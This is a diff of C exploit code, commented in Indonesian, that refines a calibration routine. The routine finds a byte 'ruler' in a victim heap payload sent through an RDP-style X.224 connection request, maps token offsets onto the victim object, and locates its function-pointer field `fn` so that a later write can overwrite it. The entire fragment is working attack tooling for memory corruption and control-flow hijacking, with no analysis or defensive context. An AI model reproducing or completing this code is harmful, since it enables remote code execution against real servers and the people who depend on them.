@@ -187,23 +187,47 @@ int main(void)
 
 	const unsigned char* pb1 = (const unsigned char*)B1;
 	dump_hex("[kalibrasi] payload korban (24 B): ", pb1, 24);
+	/* Cari penggaris TANPA mengandaikan ia mulai di nilai 1: token ditulis mulai offset
+	 * TPDU_CONNECTION_REQUEST_LENGTH (11 byte TPKT/X.224) di dalam stream, jadi byte pertama
+	 * penggaris sering sudah "terpakai" di header chunk korban. Deteksi: cari run byte yang
+	 * naik satu-satu, lalu hitung offset asalnya. */
 	int j = -1;
-	for (int i = 0; i < 20; i++)
+	long base = -1;
+	for (int i = 0; i + 6 <= 24; i++)
 	{
-		if (pb1[i] == 1 && pb1[i + 1] == 2)
+		const unsigned v = pb1[i];
+		if (v < 1 || v > (unsigned)(RULER_LEN - 6))
+			continue;
+		int runtut = 1;
+		for (int m = 1; m < 6; m++)
+		{
+			if (pb1[i + m] != (unsigned char)(v + m))
+			{
+				runtut = 0;
+				break;
+			}
+		}
+		if (runtut)
 		{
 			j = i;
+			base = (long)(RULER_START + v - 1) - i; /* token offset yang mendarat di B[0] */
 			break;
 		}
 	}
-	if (j < 0)
+	if (j < 0 || base <= 0)
 	{
-		printf("  [x] penggaris tidak tampak di payload korban — pemetaan tak bisa diukur, berhenti\n");
+		printf("  [x] penggaris tidak terbaca di payload korban — pemetaan tak bisa diukur, berhenti\n");
 		return 2;
 	}
-	const long base = (long)RULER_START - j; /* token offset yang mendarat di B[0] */
-	const size_t fn_off = (size_t)(base + 8);
-	printf("  [kalibrasi] token[%ld] → B[0]  ⇒  field `fn` ⊂ token[%zu]\n", base, fn_off);
+	const size_t fn_off = (size_t)(base + 8); /* B->fn = payload + 8 */
+	if (fn_off + sizeof(unsigned long long) > TOKEN_LEN)
+	{
+		printf("  [x] offset fn di luar token (%zu) — berhenti\n", fn_off);
+		return 2;
+	}
+	printf("  [kalibrasi] penggaris mulai di payload[%d] (nilai 0x%02x) ⇒ token[%ld] → B[0]"
+	       "  ⇒  field `fn` ⊂ token[%zu]\n",
+	       j, pb1[j], base, fn_off);
 	printf("  [kalibrasi] byte target nanti di token[%zu]:", fn_off);
 	fflush(stdout);
 
